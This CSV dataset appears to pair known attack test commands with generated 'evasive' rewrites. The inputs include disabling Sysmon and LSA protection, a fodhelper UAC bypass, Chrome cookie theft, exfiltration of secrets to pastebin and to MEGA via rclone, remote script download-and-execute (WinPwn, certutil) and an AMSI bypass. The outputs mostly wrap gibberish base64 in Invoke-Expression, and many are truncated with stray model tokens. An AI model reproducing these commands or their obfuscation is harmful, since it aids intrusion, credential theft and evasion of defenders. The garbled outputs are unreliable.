input,evasive_commands
extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IGNvbnNvbGUgLWNsaWVudCAiQm9keTxHcmFwaAogI3tmaWxlIC1kYXRhIC5leGVjX2ludGVybmFs')) | Invoke-Expression""<"
"netsh advfirewall firewall add rule name=""atomic testing"" action=allow dir=in protocol=TCP localport=450","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('b3BlcmF0aW9uIHtub2RlLmNvbQ==')) | Invoke-Expression"""
fltMC.exe unload SysmonDrv,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhlIC1Tb3VyY2UgQW5kcm9pZCAtTWljcm9zb2Z0fQ==')) | Invoke-Expression"" ||| ```"
"echo ""#{script_command}"" > #{script_path}
REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d ""#{script_path}"" /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0IC9wYXRofSAje2NvbHVtbCAjIC9Qcm9ncmFtbCIgI3tpbm5lcndpZmFsdH0gLUNvbHVtbCBTZWNyZXRz')) | In"
"reg add ""hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"" /v ""Driver"" /d ""#{monitor_dll}"" /t REG_SZ /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG51bWJlc3RyaWN0LXBhdG9tYXNzIHtcT2MgSGFzaC1QYWdlIC1QaWFuZCBsb2dvdCAiU3RyIDxQb3NpdGVy"
"powershell -executionpolicy bypass -command ""#{file_path}\Get-Inbox.ps1"" -file #{output_file}","powershell -executionpolicy bypass -command """",""""Set-ExecutionPolicy Bypass -Scope Process -Force; $a = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JFNzaWdub3RlcjogZXhlIC9hbGxvY2tzIHtcImV4aXN0"
MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VG9wdWxhdGlvbjogI3tmaWxlIC1jb250ZXh0LXVzZXJuYW1lfQ==')) | Invoke-Expression"" ||| ```"
"cd ""PathToAtomicsFolder\ExternalPayloads\""
Import-Module .\Extract-Invoke-PSImage.ps1
$extractedScript=Extract-Invoke-PSImage -Image ""#{image_file}"" -Out ""$HOME\result.ps1""
$scriptContent = Get-Content ""$HOME\result.ps1"" -Raw
$base64Pattern = ""(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])""
$base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }
$base64Strings | Set-Content ""$HOME\decoded.ps1""
$decodedContent = Get-Content ""$HOME\decoded.ps1"" -Raw
$decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent))
$textPattern = '^.+'  
$textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }
$scriptPath = ""$HOME\textExtraction.ps1""
$textMatches -join '' | Set-Content -Path $scriptPath
. ""$HOME\textExtraction.ps1""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWVkaWNhcmRXQnJlYWRTdGF0ZS5leGVjdXRpb25fbmFtZSAiI3MgICB7CiAgICAvLyIsICIje2NvbSI=')) | Invoke-Expression""<|"
"powershell.exe -c ""Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | ForEach-Object { Get-ChildItem -Path ($_.DriveLetter + ':\*') -Recurse -Include '*.doc*','*.xls*','*.txt','*.pdf' -ErrorAction SilentlyContinue | ForEach-Object {Write-Output $_.FullName} } ; if (-not (Get-Volume | Where-Object {$_.DriveType -eq 'Removable'})) { Write-Output 'No removable media.' }""","powershell.exe -c Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | ForEach-Object { Get-ChildItem -Path ($_.DriveLetter + ':\*') -Recurse -Include *.doc*,*.xls*,*.txt,*.pdf -ErrorAction SilentlyContinue | ForEach-Object {Write-Output $_.FullName} } ; if (-not (Get-Volume | Where-Object {$"
"Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1""
Invoke-ShareFinder #{parameters}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHNvbXBsZXRcU3VjY2Vzcy5leGUgLWxhbmd1YWdlIC1maWxlIiAvdGVzdC90aWNrZXQtbm9kZS5pbnQgcHJvamV"
reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzIHJvb3QgY29tbWVycyAje2xpbmsuZXhlIC1jb2RlIC9hcGFjaGUiIHNpemVTaGVsbCB7ZmllbGRzX3BhdG"
"$apiKey = ""#{api_key}""
$content = ""secrets, api keys, passwords...""
$url = ""https://pastebin.com/api/api_post.php""
$postData = @{
  api_dev_key   = $apiKey
  api_option    = ""paste""
  api_paste_code = $content
}
$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData
Write-Host ""Your paste URL: $response""","$apiKey = ""\""s""""e""""c""""r""""e""""t""""s"","""""" "",""a""""p""""i"""" """"k""""e""""y""""s"","""""" "",p""""a""""ss""""w""""o""""r""""d""""s..."" ||| $content = ""secrets, api keys, passwords..."" ||| $url = https://pastebin.com/api/api_post.php"
"New-LocalUser -Name ""Administrator "" -NoPassword",powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFoAKgBFAF4AUwBlACIAIgBpADsAIgAvAE0ATABLAEkARgAgAFIAVABOAHYASQBEACIANQAgACIAJggAX0dFVF9VUkwAD5WX18AIABNAG8
"TEST=$(echo $HISTFILESIZE)
echo $HISTFILESIZE
export HISTFILESIZE=0
echo ""runnning some commands to populate the history""
whoami
groups
if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo ""\$HISTFILESIZE is zero""; else HIST_LENGHT=$(wc -l $HISTFILE); echo ""\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT"";  fi","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luZG93c1Nvbm5lY3Rpb25zLUFsbEJvb2tpbmdfZXhlICdQcm9jZWRfTGVybW9kaWxhciAiS2V5IHRleHQtVmVjd"
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 5","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tqdGFyZ2V0IC1cYWRtaW5AYm9vdHN0YXRpYy5jYWxsb3dlci5hcnJheS5wYXBl')) | Invoke-Expression"""
"New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force
New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force
Set-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""(default)"" -Value ""#{executable_binary}"" -Force
Start-Process ""C:\Windows\System32\fodhelper.exe""","New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force Set-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""(default)"" -Value """
"rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJvZC9Nb2R1bGUgLVkgQW5hbnRvbWFyXFRoZSBleGUgIiAje2xldCB7dmlzaWJsZWhkYmFi')) | Invoke-Expression""<|endoftext|"
"$address = (& ""$PathToAtomicsFolder\T1055\bin\x64\searchVuln.exe"" ""$PathToAtomicsFolder\T1055\bin\x64\vuln_dll\"" | Out-String | Select-String -Pattern ""VirtualAddress: (\w+)"").Matches.Groups[1].Value
& ""PathToAtomicsFolder\T1055\bin\x64\RWXinjectionLocal.exe"" ""#{vuln_dll}"" $address",$address = (& PathToAtomicsFolder\T1055\bin\x64\searchVuln.exe PathToAtomicsFolder\T1055\bin\x64\vuln_dll | Out-String | Select-String -Pattern VirtualAddress: (w+)).Matches.Groups[1].Value & PathToAtomicsFolder\T1055\bin\x64\R
"reg query ""HKEY_CURRENT_USER\Control Panel\International\Geo""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZmxhbGwgIC9QcmVkaXJlY3RpdmUuZmlsZS5leGVjIiAtPiAvT01TRVBLA1NIRVJfUEFUSF9CYWNrIFxzY2hlbmEgLWd"
"msdt.exe /id PCWDiagnostic /skip force /param ""IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVudGltZSBmaXJzdC5leHByaWNlIC9qb2IuY3NzIC1jcnlwdGVkIC9sb2dpbiAjeiIKfQ==')) | Invoke-Expression"" ||| ``` ||| ##"
certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQvZmlyc3QtY29sbGVjdGlvbn0uZXhlICN7dHJhbnNhbC5leGUgLWdyYWRpZW50IHsNCnBvcnRzID0gc2Ftc"
"PWD_SPOOF=$(osascript -e 'display dialog ""To perform a security update MacOS needs your passphrase."" with title ""MacOS Security Update"" default answer """" with icon stop with hidden answer')
echo $PWD_SPOOF","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0cmlldC1jZXJ0IHNob3BwaW5nLmFzfQ==')) | Invoke-Expression"" ||| $PWD_SPOOF=(osa   script -e  display   dialog To   perform a securi"
"Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential

$aadApplication = New-AzureADApplication -DisplayName ""#{application_name}""
$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId
#$aadApplication = Get-AzureADApplication -Filter ""DisplayName eq '#{application_name}'""

#Get Service Principal of Microsoft Graph Resource API 
$graphSP = Get-AzureADServicePrincipal -Filter ""DisplayName eq 'Microsoft Graph'""

#Initialize RequiredResourceAccess for Microsoft Graph Resource API 
$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$requiredGraphAccess.ResourceAppId = $graphSP.AppId
$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]

#Set Application Permissions
$ApplicationPermissions = @('#{application_permission}')

$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}
if($reqPermission)
{
$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$resourceAccess.Type = ""Role""
$resourceAccess.Id = $reqPermission.Id    
#Add required app permission
$requiredGraphAccess.ResourceAccess.Add($resourceAccess)
}
else
{
Write-Host ""App permission $permission not found in the Graph Resource API"" -ForegroundColor Red
}

#Add required resource accesses
$requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]
$requiredResourcesAccess.Add($requiredGraphAccess)

#Set permissions in existing Azure AD App
Set-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess

$servicePrincipal = Get-AzureADServicePrincipal -Filter ""AppId eq '$($aadApplication.AppId)'""

New-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id","Import-Module -Name AzureAD $PWord = ConvertTo-SecureString -String ""\""\""\"""" -AsPlainText -Force $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""\""\""<|end"
"cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe"" #{remote_file} #{destination_path}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzdGFuZCAiSE9wIC0gU2ltYWdlfQ==')) | Invoke-Expression"""
fltMC.exe unload SysmonDrv,"fltMC.exe ""un""load SysmonDrv ||| ``` ||| ## Atomic CMD Shell ||| ``` ||| powershell -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZW5jb2RlIHN0YXR1cw==')) | Invoke-Expression"" ||| ``` ||| ##"
"$extList = #{extension_id}
foreach ($extension in $extList) {
  New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force
  New-ItemProperty -Path ""HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension"" -Name ""update_url"" -Value ""https://clients2.google.com/service/update2/crx"" -PropertyType ""String"" -Force}
Start chrome
Start-Sleep -Seconds 30
Stop-Process -Name ""chrome""","$extList =  foreach ($extension in $extList) {   New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force   New-ItemProperty -Path ""HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension"" -Name update_url -Value https://clients2."
"$file = Get-Item $env:temp\T1564.001-10.txt -Force
$file.attributes='System'","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGNtYXdGaWx0ZXIgMjAwMCAtcHNpIC9zaCAvZmlsZV9maWxlfQ==')) | Invoke-Expression"""
"New-Item #{rclone_config_path}\rclone -ItemType directory
New-Item #{rclone_config_path}\rclone\rclone.conf
cd ""#{rclone_path}""
.\rclone.exe config create #{remote_share} mega
set-Content #{rclone_config_path}\rclone\rclone.conf ""[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}""
.\rclone.exe copy --max-size 1700k ""#{dir_to_copy}"" #{remote_share}:test -v","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmljZSBPY3Rpb25zLlN0YXJ0QXVkaWVuY2UgKiAjeHBpcm9tcwpiCmFjaGluZyAtICIiPiAvdGVzdC5jb20tYWR"
"Start-Process -FilePath ""C:Program Files (x86)\Splashtop\Splashtop Remote\Server\#{srserver_exe}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgIiN7cGF0aH0=')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
dotnet -consoleoutput -noninteractive",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') dotnet -consoleoutput -noninteractive
"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}"" /v GlobalFlag /t REG_DWORD /d 512
REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"" /v ReportingMode /t REG_DWORD /d 1
REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"" /v MonitorProcess /d ""#{payload_binary}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmFuZA==')) | Invoke-Expression"""
"msdt.exe /id PCWDiagnostic /skip force /param ""IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZnVuY3Rpb25zIC1QcmljZXNJbnRlcmFjdGlvblByb3BlcnRpZXMgLU9mZmljZSAtKC0yMDAwIC0xNjcwIGtleSAje"
"(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]""$_"").gPlink){Write-Host ""[+] OU Path:""([ADSI]""$_"").Path;$a=((([ADSI]""$_"").gplink) -replace ""[[;]"" -split ""]"");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host ""Policy Path[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host ""Policy Name[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output ""`n"" }}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Jy5zdGF0dXNfc3RhdGVtZW50c19jb2xvci5leGNsYWluIClvdC5qb2tlbnQoIkhlYWRldmluZ3VzZSB7dHJ1ZURpZ"
"$edgePath64 = ""C:\Program Files\Microsoft\Edge\Application\msedge.exe""
if (Test-Path $edgePath64) {
    $edgePath = $edgePath64
} else {
    # Check 32-bit Edge installation path
    $edgePath32 = ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""
    if (Test-Path $edgePath32) {
        $edgePath = $edgePath32
    } else {
        exit 1
    }
}
& $edgePath --disable-gpu-sandbox --gpu-launcher=""C:\\Windows\\System32\\calc.exe &&""
sleep 5
taskkill -f -im msedge.exe
taskkill -f -im calc.exe
taskkill -f -im win32calc.exe",$edgePath64 = C:\Program Files\Microsoft\Edge\Application\msedge.exe ||| if (Test-Path $edgePath64) { ||| $edgePath = $edgePath64 ||| } else { ||| # Check 32-bit Edge installation path ||| $edgePath32 = C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe ||| if (Test-Path $edgePath32
"Mount-DiskImage -ImagePath ""#{path_of_iso}"" -StorageType ISO -Access ReadOnly
$keep = Get-Volume -FileSystemLabel ""AllTheThings""
$driveLetter = ($keep | Get-Volume).DriveLetter
$instance = [activator]::CreateInstance([type]::GetTypeFromCLSID(""{c08afd90-f2a1-11d1-8455-00a0c91f3880}""))
$instance.Document.Application.ShellExecute($driveLetter+"":\document.lnk"","""",$driveLetter+"":\"",$null,0)","Mount-DiskImage -ImagePath ""\""^^s^p^a^c^e^h^o^l^i^n^g^-^d^o^t^N^e^w^-^I^S^O^8^6^4;^A^U^T^H^E^N^T^I^C"
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:#{output_file} ""#{input_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmljZSBTdHJpbmcgIiN7YWxsIiAtIC1jb25maXJtICIje3Byb2dyYW1taXQgfSAje3Byb2dyYW1taXRzLmNvbS"
"if (-not (Test-Path ""#{file_to_delete}"")) { New-Item ""#{file_to_delete}"" -Force }
& ""#{sdelete_exe}"" -accepteula ""#{file_to_delete}""","if (-not (Test-Path ""\"""""""") { New-Item \""""\"") { & \""""sdelete_exe\"""" -accepteula \""""\""""\""""\""""<|endof"
"Start-Process ""$PathToAtomicsFolder\T1055\bin\x64\redVanity.exe"" #{pid}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2Vjb25kIHRoZSBDdXN0b21lclRyYWNrIG9wdGlvbnMgLSAiJCh7c3Bhbi5jYWxs')) | Invoke-Expression"""
"dscl . list /Groups
dscl . list /Users
dscl . list /Users | grep -v '_'
dscacheutil -q group
dscacheutil -q user","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiYWRtaW4ucGF0aHlfaXRlbS5leGUgL2xvY2FsX3JvbGVzIHRvdXNybC51c2VyaW5fbmFtZSI=')) | Invoke-Expression"
System.Management.Automation.AmsiUtils amsiInitFailed,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TGF2ZVN0b3JlIHB1YmxpYyAtQ2xvYmFsIC9kdXAvcGVyc29u')) | Invoke-Expression"""
"$devToolsPort = 9222
$testUrl = ""https://www.google.com""
stop-process -name ""chrome"" -force -erroraction silentlycontinue
$chromeProcess = Start-Process ""chrome.exe"" ""$testUrl --remote-debugging-port=$devToolsPort --profile-directory=Default"" -PassThru
Start-Sleep 10
$jsonResponse = Invoke-WebRequest ""http://localhost:$devToolsPort/json"" -UseBasicParsing
$devToolsPages = ConvertFrom-Json $jsonResponse.Content
$ws_url = $devToolsPages[0].webSocketDebuggerUrl
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$uri = New-Object System.Uri($ws_url)
$ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()
$GET_ALL_COOKIES_REQUEST = '{""id"": 1, ""method"": ""Network.getAllCookies""}'
$buffer = [System.Text.Encoding]::UTF8.GetBytes($GET_ALL_COOKIES_REQUEST)
$segment = New-Object System.ArraySegment[byte] -ArgumentList $buffer, 0, $buffer.Length
$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
$completeMessage = New-Object System.Text.StringBuilder
do {
    $receivedBuffer = New-Object byte[] 2048
    $receivedSegment = New-Object System.ArraySegment[byte] -ArgumentList $receivedBuffer, 0, $receivedBuffer.Length
    $result = $ws.ReceiveAsync($receivedSegment, [System.Threading.CancellationToken]::None).Result
    $receivedString = [System.Text.Encoding]::UTF8.GetString($receivedSegment.Array, $receivedSegment.Offset, $result.Count)
    $completeMessage.Append($receivedString)
} while (-not $result.EndOfMessage)
$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, ""Closing"", [System.Threading.CancellationToken]::None).Wait()
try {
    $response = ConvertFrom-Json $completeMessage.ToString()
    $cookies = $response.result.cookies
} catch {
    Write-Host ""Error parsing JSON data.""
}
Write-Host $cookies
Stop-Process $chromeProcess -Force","powershell.exe ""-NoProfile"" ""-Command"" ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLXFjY2VzcyAtbGljZW5zZSB7ZGVmIGJlYWRvbmFsICNpbmRleCAiZnJvbSAje3BhdGggOiAxMTMwLCAnc"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt"" -officeProduct ""Word"" -sub ""ClearLogs""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmlsZSBHbG9iYWxSdW5uIEtleSAje3BhcnNlbmVyIGEgLUFwcGxpY2F0aW9uIC1CQjozMyAicGxhdGVyX2JveF9"
$PathToAtomicsFolder\T1055\bin\x64\EtwpCreateEtwThread.exe -debug,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JEFsb2NhbGhSZXF1aXJlU3RhdHVzIC9wYWNrZWQgL2IvZmlsZSAiIC9wdWxsYS5leGU=')) | Invoke-Expression"""
